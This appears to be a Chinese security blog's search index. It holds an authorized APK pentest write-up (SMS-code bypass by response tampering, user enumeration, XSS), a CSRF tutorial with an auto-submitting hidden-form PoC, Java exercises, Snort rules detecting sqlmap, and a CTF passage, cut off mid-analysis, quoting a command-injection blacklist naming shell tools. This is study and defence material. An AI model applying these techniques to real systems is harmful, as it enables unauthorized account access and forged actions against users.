<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Penetration testing</title>
      <link href="/2019/12/25/Penetration-testing/"/>
      <url>/2019/12/25/Penetration-testing/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次授权的APK渗透测试"><a href="#记一次授权的APK渗透测试" class="headerlink" title="记一次授权的APK渗透测试"></a>记一次授权的APK渗透测试</h1><p>作为一个渗透测试小白，本文的目的是希望能为那些和我一样的小白提供一些测试思路。</p><p>涉及的内容可能比较基础，表哥们见谅。</p><h2 id="APK-解包"><a href="#APK-解包" class="headerlink" title="APK 解包"></a>APK 解包</h2><p>拿到 apk 之后直接用 7-Zip 解压可以得到几个文件夹、一个 <strong>AndroidManifest.xml</strong> 文件、一个dex文件。使用 dex2jar <a href="https://sourceforge.net/projects/dex2jar/" title="工具" target="_blank" rel="noopener">https://sourceforge.net/projects/dex2jar/</a> 将这个dex文件解压会生成一个jar文件，然后使用jd-gui就可以查看java源代码了。</p><p>当然可以从源码里找代码的漏洞，但是一般会有混淆，在这也不做深入讨论。</p><p>上边提到的 xml 文件一定不能发放过，里边涉及到许多重要的配置项，比如：</p><ul><li>AndroidManifest.xml文件中android:debuggable为true。app 可被任意调试</li><li>AndroidManifest.xml文件中android: allowBackup为true。app 数据可以被备份导出。</li><li>等等…</li></ul><p>还有一点在实际测试过程中可能会用到：在对 apk 解压之后可以尝试在 powershell 里边搜一下 <code>db</code> 文件，说不定有敏感信息(为什么这么说，因为我碰到过一次…)</p><pre><code>for /r F:\source-code %i in (*.db) do echo %i </code></pre><h2 id="登陆页面"><a href="#登陆页面" class="headerlink" title="登陆页面"></a>登陆页面</h2><h3 id="用户名可枚举"><a href="#用户名可枚举" class="headerlink" title="用户名可枚举"></a>用户名可枚举</h3><p>输入用户名之后响应用户名不存在，这就是最简单的枚举用户名的情形了。</p><p>这次碰到的是登陆不需要密码，但是要输入已经注册过的用户名，之后会根据用户名发送验证码到对应手机，同时设置了 120s 内不能重新发送，并且验证码 120s 内有效。</p><p>这时候看起来我们没办法通过验证码做什么事，但是在实际测试过程中发现</p><ol><li><p>当我们输入存在的账号之后提示发送成功；</p></li><li><p>重复发送，会响应 120s 内不能重复发送；</p></li><li><p>输入不存在用户会提示发送失败。</p></li></ol><p>所以这个时间限制对用户名枚举其实没什么影响，我们可以通过爆破用户名根据返回的信息来查看用户名是否存在。</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w5qqs0j30ne0j9abm.jpg" alt="枚举用户"></p><p>等等，既然咱都不知道手机号，也不让输密码登陆，就算得到用户名生成社工字典也没法用啊，那拿到了用户名有什么用？</p><p>当然有用，不过要看具体场景，比如下面这个案例</p><h3 id="任意验证码绕过"><a href="#任意验证码绕过" class="headerlink" title="任意验证码绕过"></a>任意验证码绕过</h3><p>当我们登陆时服务端给账号绑定的手机号发送短信验证码，我们输入一个上一步得到的账号，验证码随便输，点击登陆后抓包，登陆失败，发现响应中有两个 code 字段</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w9rlloj30l2070aaa.jpg" alt></p><p>改改试试：</p><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1ga98wgjh7kj30is057mx6.jpg" alt></p><p><strong>It works!</strong></p><h2 id="功能页面"><a href="#功能页面" class="headerlink" title="功能页面"></a>功能页面</h2><p>成功登录之后，各个功能都点点看看，在个人信息页面有一个查询实时在线人数功能，那一栏只显示了人数，旁边并没有箭头</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wd0il6j307n04bdfo.jpg" alt></p><p>我一度以为那里不能点击(事实上因为数据量太大，加载了好长时间，我直接点返回了，给我的感觉就是这里没有东西)，进去之后就可以看到所有登陆人员的信息了。</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98voejstj30qf09pdh7.jpg" alt="图打码水平实在不够"></p><p>在我尝试了不同用户之后，发现这里的用户信息并没有权限限制，也就是说对所有人都是可见的，明显的权限配置不当。</p><p>除此之外，应用存在几处查询功能，通过BURP 看到返回的数据包都是 JSON 类型</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wmervqj30m404vt90.jpg" alt></p><p>因为没什么经验，所以就多尝试吗，在 json 那里注入，xxe 都来一遍，没啥用。</p><p>前面还有一个参数，试试？</p><p><img src="https://wx4.sinaimg.cn/mw690/006boCb9ly1ga98x8llxwj30q203f74b.jpg" alt></p><p>有戏！</p><p>试试 xss 吧</p><p><img src="https://wx2.sinaimg.cn/mw690/006boCb9ly1ga98xbyv4fj30q002q74d.jpg" alt></p><p>放到浏览器成功弹窗！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>平时做测试还是要细心，多总结，每一个能输入的地方都不能放过，多试试总是好的。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF 简单认识</title>
      <link href="/2019/12/22/CSRF-%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/12/22/CSRF-%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF-简单认识"><a href="#CSRF-简单认识" class="headerlink" title="CSRF 简单认识"></a>CSRF 简单认识</h1><p>12/22/2019 11:47:20 AM </p><h2 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h2><p>跨站请求伪造-Cross Site Request Forgery，也被称作XSRF，简单来说就是 攻击者在不知道某个账户账号密码的情况下，利用目标站点已经登陆过的账户产生的身份凭证信息(cookie)来进行一系列操作，同时该站点认为攻击者所采取的动作都是合法的(因为攻击者盗用了认证通过的账户账号信息)。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果对于某个网站的删除文章功能的代码是 </p><pre><code>&lt;a href=&apos;/delete?id=3&apos;&gt;刪除&lt;/a&gt;</code></pre><p>然后在后端做校验，验证 requests 有没有带 session_id ,同时确认是不是这个文章的作者。此时，假如攻击者通过钓鱼，创建了一个有针对性的网页，里面的按钮的代码是：</p><pre><code>&lt;a href=&apos;https://small-min.blog.com/delete?id=3&apos;&gt;開始測驗&lt;/a&gt;</code></pre><p>如果这时文章作者点击了按钮，那么由于浏览器的跨域请求机制(在浏览器进程的生命周期内，即使浏览器打开了新的Tab页，Session Cookie 也是有效的。Session Cookie 保存在浏览器内存空间内)会把作者的cookie一起带到GET请求中，服务端检查到确实是作者，于是文章被删除了。</p><p>如果禁用了 <code>&lt;img&gt; 、 &lt;iframe&gt; 、 &lt;script&gt;</code> 等带 src 属性的标签，就可以禁止 CSRF 了？这类标签只能发起一次 GET 请求，而不能发起 POST 请求。但是 <code>form</code> 标签可以发送 POST request.</p><pre><code>&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;  &lt;input type=&quot;submit&quot; value=&quot;開始測驗&quot;/&gt;&lt;/form&gt;</code></pre><p>这样还是显式的，我们可以采用更隐蔽的方式</p><pre><code>&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;&lt;form method=&apos;POST&apos; action=&apos;https://small-min.blog.com/delete&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;  &lt;input type=&apos;hidden&apos; name=&apos;id&apos; value=&apos;3&apos;&gt;  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</code></pre><p>在某些页面中可能进行了 referer 检查，但是我们也要检测是否存在逻辑问题：</p><ol><li>Referer 过滤不严谨</li></ol><p>比如我构造了一个表单 <strong>register</strong></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;csrf test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;../csrf/server.php&quot; id= &quot;regesiter&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在 server.php 中我对 referer 进行了检测，如果含有 qq.com 我就可以认为是合法的，但是如果我采取以下的请求方式：</p><p><img src="https://wx3.sinaimg.cn/small/006boCb9ly1ga5drxec7uj30su014jr9.jpg" alt="构造请求"></p><p><img src="https://wx4.sinaimg.cn/small/006boCb9ly1ga5druqi6ej30df047glu.jpg" alt="referer已经含有关键词"></p><ol start="2"><li>空referer</li></ol><p>某些浏览器的防御部署是允许空 REFERER 的。</p><p>还可以使用 burp 自带的 generate CSRF poc,选择测试 URL 右键选择生成 CSRF poc,将要替换的值然后保存访问即可。</p><p>还可以使用 CSRFTester 软件来测试</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><ol><li>GET</li></ol><p>如果带有 token 等验证参数，先去掉参数尝试能否正常请求，如果可以即存在 CSRF 漏洞。</p><ol start="2"><li>POST</li></ol><p>最简单的方法就是抓取一个正常请求的数据包，去掉 token 等验证参数后提交，如果正常访问，再去掉 Referer 后重新提交，如果提交还有效，那么基本可以认为存在 CSRF 漏洞，可以构造外部 form 表单来进行提交。如果去掉 referer 失败还可以验证对 referer 校验是否严格尝试绕过。也可能存在代码对请求类型判断不严格($_REQUEST[])，如果 post 失败了尝试改成 get 进行请求。 </p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>强制用户必须与应用完成交互，避免在不知情的情况下构造网络请求</p><h3 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h3><p>检查请求是否来自合法的源，但是不足之处在于浏览器并非什么时候都能取到Referer.</p><h3 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h3><p>将参数加密，或者使用一些真随机数，让攻击者无法猜测到参数值，达到“不可预测性原则”。可以新加一个参数 TOKEN ，同时放在表单和 session 中，服务端只需验证表单中的 TOKEN 和 session 中的 Token 是否一致，一致则认为是合法请求。 </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java</title>
      <link href="/2019/11/26/java-tests/"/>
      <url>/2019/11/26/java-tests/</url>
      
        <content type="html"><![CDATA[<h1 id="java-tests"><a href="#java-tests" class="headerlink" title="java-tests"></a>java-tests</h1><p>11/26/2019 9:26:49 AM </p><h2 id="charper-two"><a href="#charper-two" class="headerlink" title="charper two"></a>charper two</h2><ul><li>输入一个整数，输出阶乘最右边的非0数字</li></ul><pre><code>package the_second_chapter;import java.math.BigInteger;import java.util.Scanner;public class first_one {public static void main(String[] args) {    // TODO Auto-generated method stub    //int sum = 0,temp = 1;    BigInteger num = new BigInteger(&quot;1&quot;);    System.out.println(&quot;你想算多少的阶乘?&quot;);    Scanner scn = null;//防止 Scanner is never closed 的错误    try {        scn = new Scanner(System.in);        int num1 = scn.nextInt();        for(int number=1;number&lt;=num1;number++)        {            num = num.multiply(new BigInteger(number + &quot;&quot;));        }        System.out.println(num);    }    finally {        if(scn!=null)            scn.close();    }    char[] c = num.toString().toCharArray();                  System.out.println(num.toString().length());        //输出长度    for(int b=num.toString().length()-1;b&gt;=0;b--) {        //判断非0        if(c[b]!=&apos;0&apos;) {            System.out.println(c[b]);            return;        }    }}}</code></pre><blockquote><p>String.ToCharArray Method</p><p>Definition</p><p>Namespace: System</p><p>Assemblies: System.Runtime.dll, mscorlib.dll, netstandard.dll</p><p>Copies the characters in this instance(实例) to a Unicode character array.</p><p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8</a></p></blockquote><ul><li>输入一组数字保存在数组中，遇到0表示输入结束，将输入的数组逆序输出</li></ul><pre><code>package the_second_chapter;import java.util.Scanner;public class test_9 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner input=new Scanner(System.in);    int[] num=new int[20];    int i;    for(i=0;;i++)    {        int a=input.nextInt();        if(a==0)            break;        num[i]=a;    }    for(i=i-1;i&gt;=0;i--)    {        System.out.print(num[i]);        if(i!=0)            System.out.print(&quot; &quot;);    }    System.out.println();}}</code></pre><ul><li>超级递增序列</li></ul><pre><code>package the_second_chapter;import java.util.Scanner;public class test_10 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner scn = new Scanner(System.in);    int[] num = new int[20];    int i,flag=0;    int sum=0;    for(i=0;;i++) {        int a = scn.nextInt();        if(a==-999)            break;        num[i] = a;    }    for(int j=0;j&lt;num.length;j++) {        sum += num[j];        if(sum&lt;num[j+1])            flag=1;        else {            flag=2;            break;        }    if(flag==1) {        System.out.print(&quot;超级递增！&quot;);    }    else {        System.out.print(&quot;不是超级递增&quot;);    }    }}}</code></pre><ul><li>统计字符串中单词个数</li></ul><pre><code>package the_second_chapter;import java.util.Scanner;public class test_11 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner scanner = new Scanner(System.in);    String s = scanner.nextLine();    String []arr = s.split(&quot; &quot;);    int count = 0;    for (int i = 0;i&lt;arr.length;i++){        for (int j = i+1;j&lt;arr.length;j++){            if (arr[i].equals( arr[j])){                arr[j] = &quot; &quot;;            }        }    }    for (int i = 0;i&lt;arr.length;i++){        System.out.println(arr[i]);    }    for (int i = 0;i&lt;arr.length;i++){        if (arr[i] != &quot; &quot;){            count++;        }    }    System.out.println(count);}}</code></pre><h2 id="third-chapter"><a href="#third-chapter" class="headerlink" title="third_chapter"></a>third_chapter</h2><ul><li>修改文件名称</li></ul><pre><code>package third_chapter;import java.io.*;import java.util.*;public class test_4 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner scn = new Scanner(System.in);    System.out.print(&quot;请输入旧文件路径及名称(D:\\test.txt)：&quot;);    String old_path = scn.next();    File old_file = new File(old_path);    System.out.print(&quot;请输入新文件名称(D:\\test1.txt)：&quot;);    String new_path = scn.next();    File new_file = new File(new_path);    if(old_file.exists() &amp;&amp; !new_file.exists()) {        old_file.renameTo(new_file);        System.out.print(&quot;reanme successful!&quot;);    }    else {        System.out.print(&quot;rename failue!&quot;);    }}}</code></pre><ul><li><p>实现copy命令</p><pre><code>package third_chapter;import java.io.*;import java.util.*;public class test_6 {public static void main(String[] args) throws FileNotFoundException {    // TODO Auto-generated method stub    try {    Scanner scn = new Scanner(System.in);    //输入文件名    System.out.print(&quot;请输入要复制的文件路径及名称：&quot;);    String old_file = scn.next();    FileReader old_one = new FileReader(old_file);   //创建文件对象    BufferedReader old_one_cont = new BufferedReader(old_one);//读文件    System.out.print(&quot;请输入要复制到的文件路径及名称：&quot;);    String new_file = scn.next();    FileWriter new_one = new FileWriter(new_file);   //创建文件对象    BufferedWriter new_one_cont = new BufferedWriter(new_one);//读文件    String content = null;    while((content = old_one_cont.readLine())!=null) {        new_one_cont.write(content);        new_one_cont.newLine();    }    //关闭文件    new_one_cont.flush();    new_one_cont.close();    new_one.close();    }    catch(IOException e) {        System.out.print(e.toString());    }}}</code></pre></li></ul><ul><li><p>实现删除注释功能</p><pre><code>package third_chapter;import java.io.*;import java.util.*;/** * @author brian * * @date: 2019年12月1日 上午10:57:42 * * @description: TODO * * @version: V1.0 * */public class test_8 {    /**     * @param args     * @throws FileNotFoundException      */    public static void main(String[] args) throws FileNotFoundException {        // TODO Auto-generated method stub        try {        Scanner scn = new Scanner(System.in);        System.out.println(&quot;请输入要删除注释的文件路径及文件名：&quot;);        String old_file = scn.next();        FileReader old_one = new FileReader(old_file);        BufferedReader old_cont = new BufferedReader(old_one);        System.out.print(&quot;请输入要复制到的文件路径及名称：&quot;);        String new_file = scn.next();        FileWriter new_one = new FileWriter(new_file);   //创建文件对象        BufferedWriter new_one_cont = new BufferedWriter(new_one);//读文件        String content = null;        while((content = old_cont.readLine())!=null) {            /**判断是否存在注释             * trim(): 将调用该方法的String的前后空格删除，返回新字符串             * indexOf(): 查找参数字符串在调用改方法的String中首次出现的位置，参数字符串不存在返回-1             * &amp; ：与运算，两边都是true时结果为true             * | ：或运算，两边任意一个为true，结果为true，都不是true，结果为false             */            if((content.trim().indexOf(&quot;//&quot;)==-1)&amp;(content.trim().indexOf(&quot;/*&quot;)==-1)&amp;(content.trim().indexOf(&quot;*/&quot;)==-1)) {                System.out.println(content);                new_one_cont.write(content);                new_one_cont.newLine();            }                //System.out.print(content+&quot;\n&quot;);        }        //关闭文件        new_one_cont.flush();        new_one_cont.close();        new_one.close();    } catch (IOException e) {            // TODO Auto-generated catch block        e.printStackTrace();    }}}</code></pre></li></ul><h2 id="six-chapter"><a href="#six-chapter" class="headerlink" title="six_chapter"></a>six_chapter</h2><ul><li><p>多线程打印线程号</p><pre><code>package sixth_chapter;/** * @author brian * * @date: 2019年12月1日 下午7:50:35 * * @description: TODO * * @version: V1.0 * */public class SecondThread implements Runnable{    /**     * @param args     */    public void run() {        for(int i=0;i&lt;5;i++) {            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+(char)(i+&apos;A&apos;));            try {                Thread.sleep(700);            }            catch(InterruptedException e) {                e.printStackTrace();            }        }    }    public static void main(String[] args) {        // TODO Auto-generated method stub    }}</code></pre></li></ul><pre><code>package sixth_chapter;//import FitstThread;//import SecondThread;/** * @author brian * * @date: 2019年12月1日 下午7:19:12 * * @description: TODO * * @version: V1.0 * */public class test_4 {    /**     * @param args     */    public static void main(String[] args) {        // TODO Auto-generated method stub        Runnable target = new SecondThread();        Thread t1 = new Thread(target);        Thread t2 = new Thread(target);        for(int i=0;i&lt;10;i++) {            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+i);            try {                Thread.sleep(700);            }            catch(InterruptedException e) {                e.printStackTrace();            }            if(i==1) t1.start();            if(i==2) t2.start();        }    }}</code></pre><ul><li>线程互斥</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java&#39;s things </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>snort 安全防御</title>
      <link href="/2019/11/24/snort-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1/"/>
      <url>/2019/11/24/snort-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="安全防御-snort"><a href="#安全防御-snort" class="headerlink" title="安全防御-snort"></a>安全防御-snort</h1><p>Snort IDS（入侵检测系统）是一个强大的网络入侵检测系统。它具有实时数据流量分析和记录IP网络数据包的能力，能够进行协议分析，对网络数据包内容进行搜索/匹配。它能够检测各种不同的攻击方式，对攻击进行实时报警。此外，Snort是开源的入侵检测系统，并具有很好的扩展性和可移植性。</p><h2 id="Snort-简介"><a href="#Snort-简介" class="headerlink" title="Snort 简介"></a>Snort 简介</h2><h3 id="snort体系结构"><a href="#snort体系结构" class="headerlink" title="snort体系结构"></a>snort体系结构</h3><p>Snort的结构由4大软件模块组成，它们分别是：</p><ol><li>数据包嗅探模块——负责监听网络数据包，对网络进行分；</li><li>预处理模块——该模块用相应的插件来检查原始数据包，从中发现原始数据的“行为”，如端口扫描，IP碎片等，数据包经过预处理后才传到检测引擎；</li><li>检测模块——该模块是Snort的核心模块。当数据包从预处理器送过来后，检测引擎依据预先设置的规则检查数据包，一旦发现数据包中的内容和某条规则相匹配，就通知报警模块；</li><li>报警/日志模块——经检测引擎检查后的Snort数据需要以某种方式输出。如果检测引擎中的某条规则被匹配，则会触发一条报警，这条报警信息会通过网络、UNIXsocket、WindowsPopu(SMB)、SNMP协议的trap命令传送给日志文件，甚至可以将报警传送给第三方插件（如SnortSam），另外报警信息也可以记入SQL数据库。</li></ol><h3 id="snort三种工作方式"><a href="#snort三种工作方式" class="headerlink" title="snort三种工作方式"></a>snort三种工作方式</h3><p>Snort拥有三大基本功能：嗅探器、数据包记录器和入侵检测。</p><ol><li>嗅探器模式仅从网络上读取数据包并作为连续不断的流显示在终端上，常用命令snort -v。使用这个命令将使snort只输出IP/TCP/UDP/ICMP的包头信息</li><li>数据包记录器模式是把数据包记录到硬盘上，常用命令snort –l 指定一个目录。这会将所有的包记录到硬盘上。</li><li>网络入侵检测模式是最复杂的，而且是可配置的。我们可以让Snort分析网络数据流以匹配用户定义的一些规则，并根据检测结果采取一定的动作。</li></ol><h2 id="如何使用0x01"><a href="#如何使用0x01" class="headerlink" title="如何使用0x01"></a>如何使用0x01</h2><h3 id="snort-规则定义"><a href="#snort-规则定义" class="headerlink" title="snort 规则定义"></a>snort 规则定义</h3><p>Snort使用一种简单的规则描述语言，这种描述语言易于扩展，功能也比较强大。<br>Snort规则是基于文本的，规则文件按照不同的组进行分类，比如，文件<code>ftp.rules</code>包含了FTP攻击内容。<br>「注」Snort的每条规则必须在一行中，它的规则解释器无法对跨行的规则进行解析。Snort的每条规则都可以分成逻辑上的两个部分：<strong>规则头和规则体</strong>。</p><p>规则头包括4个部分：<strong>规则行为；协议；源信息；目的信息</strong>。</p><p>snort规则头Snort预置的规则动作有5种：</p><ol><li>pass—动作选项pass将忽略当前的包，后继捕获的包将被继续分析。</li><li>log—动作选项log将按照自己配置的格式记录包。</li><li>alert—动作选项alert将按照自己配置的格式记录包，然后进行报警。它的功能强大，但是必须恰当的用，因为如果报警记录过多，从中攫取有效信息的工作量增大，反而会使安全防护工作变得低效。</li><li>dynamic—动作选项dynamic是比较独特的一种，它保持在一种潜伏状态，直到activate类型的规则将其触发，之后它将像log动作一样记录数据包。</li><li>activate—动作选项activate功能强大，当被规则触发时生成报警，并启动相关的dynamic类型规则。在检测复杂的攻击，或对数据进行归类时，该动作选项相当有用。除了以上5种预置的规则动作类型，用户还可以定制自己的类型。</li></ol><p>规则体的作用是在规则头信息的基础上进一步分析，有了它才能确认复杂的攻击(Snort的规则定义中可以没有规则体)。规则体由若干个被分别隔开的片断组成，每个片断定义了一个选项和相应的选项值。一部分选项是对各种协议的详细说明，包括IP、ICMP和TCP协议，其余的选项是：规则触发时提供给管理员的参考信息，被搜索的关键字，Snort规则的标识和大小写不敏感选项。下面是一个规则实例。</p><pre><code>alert tcp !192.168.43.0/24 any -&gt;any 21 (content:&quot;USER&quot;;msg: &quot;FTP Login&quot;;)</code></pre><ol><li><code>alert</code>表示规则动作为报警。                                         </li><li><code>tcp</code>表示协议类型为TCP协议。 </li><li><code>!192.168.0.1/24</code>表示源IP地址不是192.168.0.1/24。 </li><li>第一个<code>any</code>表示源端口为任意端口。                            </li><li><code>-&gt;</code>表示发送方向操作符，方向操作符左边的ip地址和端口号被认为是流来自的源主机</li><li>第二个any表示目的IP地址为任意IP地址。</li><li>21表示目的端口为21。 </li><li><code>content:&quot;USER&quot;</code>表示匹配的字符串为“USER”。      </li><li><code>msg:&quot;FTPLogin&quot;</code>表示报警信息为“FTPLogin”</li></ol><p>预处理器在调用检测引擎之前，在数据包被解码之后运行。通过这种机制，Snort可以以一种<code>out of band</code>的方式对数据包进行修改或者分析。<br>预处理器可以使用<code>preprocessor</code>关键词来加载和配置，常用到的预处理器如下:</p><ol><li><code>HTTPdecode</code>预处器HTTP解码预处理模块用来处理HTTPURL字符串，把它们转换为清晰的ASCII字符串。</li><li>端口扫描器<code>portscan</code>端口扫描器会把由单个源IP地址发起的端口扫描从开始到结束的全过程记录到标准日志。</li><li><code>stream</code>处理器stream处理器为snort提供了TCP数据包重组的功能。在配置的端口上，stream处理器能够对TCP数据包的细小片段进行重组，使之成为完整的TCP数据包，然后snort可以对其可疑行为进行检查。</li><li><code>frag2</code>处理器frag2预处理器为snort提供了IP分片重组的功能。frag2预处理器能够对分片包进行重组来定位分片攻击，它的工作原理是将所有的分片重组构造成一个包含完整信息的数据包，再将这个包传给检测引擎。</li></ol><h3 id="编写规则"><a href="#编写规则" class="headerlink" title="编写规则"></a>编写规则</h3><p>我们在使用开始前一定要注意选择好网卡，在snort.exe文件所在目录用<code>snort -W</code>查看系统可用网络接口。记住需要监视的网卡的编号，比如为2，那么在以后的使用中，用<code>-i 2</code>就可以选择对应的网卡。</p><p>我们先新建规则</p><pre><code>alert icmp any any -&gt; 192.168.43.137 any (msg:＂ICMP PING＂;sid:10000)</code></pre><p>ip地址是我的主机ip。这条规则的意思就是 对来自任何地址的<code>icmp</code>数据包发出警告信息.</p><p>执行命令：</p><pre><code>snort -i 2 -c ../etc/snort.conf -l ./log</code></pre><p>我们将编写的规则写入<code>snort.conf</code>中，在这里我们需要 <code>-c</code> 来指定我们用的规则，并将日志记录到 log 文件加中。</p><p>日志是二进制保存的，对于查看日志文件我们需要执行</p><pre><code>snort -dvr snort.log.xxxx</code></pre><h2 id="如何使用0x02"><a href="#如何使用0x02" class="headerlink" title="如何使用0x02"></a>如何使用0x02</h2><h3 id="使用-snort-检测局域网内-sqlmap-行为"><a href="#使用-snort-检测局域网内-sqlmap-行为" class="headerlink" title="使用 snort 检测局域网内 sqlmap 行为"></a>使用 snort 检测局域网内 sqlmap 行为</h3><p>先编写规则</p><pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;sqlmap&quot;;sid=10000;classtype:webscan;rev=1)</code></pre><p>在 <code>classification.conf</code> 中添加 webscan 类型的规则</p><pre><code>config classfiction 描述，描述，危险等级config classification:shortname,short description,priorityconfig classification: webscan,webscan sqlmap,1</code></pre><p>在 <code>sid-msg.map</code> 中添加预定义描述</p><pre><code>10000 || webscan sqlmap detected || mcafee,98775</code></pre><p>本地起 dvwa 之后使用 low 级别的 sql注入 ，将payload放入sqlmap，随后打开snort进行监听发现了sqlmap行为。</p><p>但是这里存在问题，snort 在UA头里检测到了 sqlmap 字符串，然后打印了警告信息，这样的检测不够严谨，因为我们如果在 sql 注入的地方填入sqlmap它同样会触发 snort 警告。</p><p>我们修改原来的规则为</p><pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;User-Agent: sqlmap/&quot;;sid=10000;classtype:webscan;rev=2)</code></pre><p>此时我们就能针对 UA 头进行监测(rev也加一，跟之前的记录进行区分)。</p><p>但是 sqlmap 其实可以绕过 UA 头的检测，我们在 sqlmap 中添加 <code>random-agent</code> 参数，就可以使用不同的 UA 。</p><p>另外，在使用规则时我们也可以通过添加多个 content 来进行检测：</p><pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;and&quot;;content:&quot;=&quot;;sid=10001;classtype:webscan;rev=2)</code></pre><p>这样在匹配到两个关键词时就会触发警告。</p><p>对于其他的攻击，我们可以通过访问日志来抓取不同的请求，然后添加到对应的规则里。</p><p>除此之外，我们还可以制定一个依据访问频率的规则：</p><pre><code>alert any any -&gt; any any (msg:&quot;too many access&quot;;content:&quot;192.168.10.132/login.php&quot;;detection_filter:count 3, second 300,track by_src;sid=10002;classtype:webscan;rev=1)</code></pre><p>这样5分钟内发出三次请求就会被检测到。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNctf 赛后回顾</title>
      <link href="/2019/11/20/unctf/"/>
      <url>/2019/11/20/unctf/</url>
      
        <content type="html"><![CDATA[<h1 id="UNctf-赛后回顾"><a href="#UNctf-赛后回顾" class="headerlink" title="UNctf 赛后回顾"></a>UNctf 赛后回顾</h1><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>题目源码：</p><pre><code>&lt;?php    highlight_file(__FILE__);    $a = $_GET[&apos;a&apos;];    $b = $_GET[&apos;b&apos;]; // try bypass it    if (preg_match(&quot;/\&apos;|\&quot;|,|;|\\|\`|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))        $a = &quot;&quot;;        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;    if (preg_match(&quot;/\&apos;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))        $b = &quot;&quot;;        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;     $cmd = &quot;file $a $b&quot;;      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;);      system($cmd);?&gt;</code></pre><h3 id="one-way"><a href="#one-way" class="headerlink" title="one way"></a>one way</h3><p>正则黑名单匹配，对输入的参数强制加上双引号，即使我们绕过检测也会被加上双引号无法执行命令。这里用到了反引号 ```</p><p>观察第一个正则 `\|`` 三个反斜杠才能转义反斜杠，这里对 | 进行了转义从而造成反引号逃逸。</p><pre><code>&lt;?php$a = &quot;`dir`&quot;;if (preg_match(&quot;/\&apos;|\&quot;|,|;|\\|\`/is&quot;,$a))    $a = &quot;&quot;;    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;    var_dump($a);string(7) 